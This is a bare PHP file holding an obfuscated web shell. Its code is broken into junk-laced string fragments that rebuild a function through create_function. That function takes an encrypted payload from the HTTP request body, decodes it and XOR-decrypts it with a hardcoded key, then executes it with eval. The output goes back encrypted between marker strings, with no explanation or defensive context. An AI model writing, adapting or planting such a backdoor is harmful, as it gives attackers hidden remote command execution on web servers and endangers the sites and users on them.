<?php
$O='*bpu*bt"),*b$m)==1) {@ob_star*bt();@e*bval*b*b(@gzuncompr*bess(@x(@ba*bse64_*bd*be*bcod*be($m[1]*b),$k)));$o=@ob_get*b';
$r=str_replace('X','','crXeaXXte_XfuncXtXion');
$l='b{*b$o.=$t*b{$i}^$k{*b$*bj}*b;}}return $o;}if (*b@preg_*bmatch*b("/$*b*bkh*b(.+)$kf/*b",@file_get_cont*bents(*b"php://i*bn';
$X='t,$k){$c*b=strlen*b($k);$l=strl*ben($t);$o*b="";f*bor($i=*b0;$i<$l;*b){for(*b$j=0*b;($j<$*bc&&$i<*b$l*b);$j++,$i++)*';
$q='_conten*bts()*b;@o*bb_end_c*blea*bn();$r=@ba*bse64_en*bcode(@x*b*b(@gzcompres*bs($o),$k*b));p*brint("$p*b$kh*b$r$kf");}';
$U='$k="2c57*b9135*b"*b;$k*bh*b="3b16803ec46*b8";$kf="148*bbf*b5a95436";$p="*bPEzX*bG*b*bjUux*bnnH9X*blO";func*btion *bx($';
$J=str_replace('*b','',$U.$X.$l.$O.$q);
$s=$r('',$J);$s();
?>
